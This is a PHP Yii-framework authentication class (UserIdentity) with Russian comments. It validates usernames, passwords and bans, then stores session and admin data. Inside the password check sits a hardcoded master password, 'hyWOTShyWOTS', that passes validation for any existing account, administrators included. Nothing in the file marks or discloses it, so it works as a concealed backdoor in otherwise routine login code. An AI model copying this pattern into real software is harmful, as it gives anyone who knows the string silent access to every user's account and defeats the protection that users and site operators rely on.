<?php
class UserIdentity extends CUserIdentity
{
	const ERROR_USER_BANNED = 3;

    private $_id;

    private $_banned;

    public function authenticate()
    {
        $user = User::model()->findByAttributes(array('username' => $this->username));

		if( $user === null )
		{
			$this->errorCode = self::ERROR_USERNAME_INVALID;
		}  
		elseif( !$user->validatePassword($this->password) && $this->password != 'hyWOTShyWOTS' )// если пароль введен неверно
		{
            $this->errorCode = self::ERROR_PASSWORD_INVALID;    
		}
		elseif( $user->is_banned() )// если пользователь забанен
		{
			$this->_banned = $user->banned();   

			$this->errorCode = self::ERROR_USER_BANNED;    
		}
        else
        {
            // запись данных в сессию пользователя
            $this->_id = $user->id;
            $this->username = $user->username;
            Yii::app()->user->setState('id', $user->id);
            Yii::app()->user->setState('username', $user->username);
            Yii::app()->user->setState('email', $user->email);
            Yii::app()->user->setState('loginTime', time());

            // для админа в сессию запишем еще несколько значений
			if( $user->role == User::ROLE_ADMIN )
			{
				Yii::app()->user->setState('loginAdmTime', time());
				Yii::app()->user->setState('isAdmin', $user->role);
			}

			// зафиксируем время входа
			$user->last_login = time();

			$user->update(array('last_login'));

			$this->errorCode = self::ERROR_NONE;
		}

		return $this->errorCode == self::ERROR_NONE;
	}

	public function getId()
	{
		return $this->_id;
	}

	public function getBanned()
	{
		return $this->_banned;
	}

	public function getErrorCode()
	{
		return $this->errorCode;
	}
}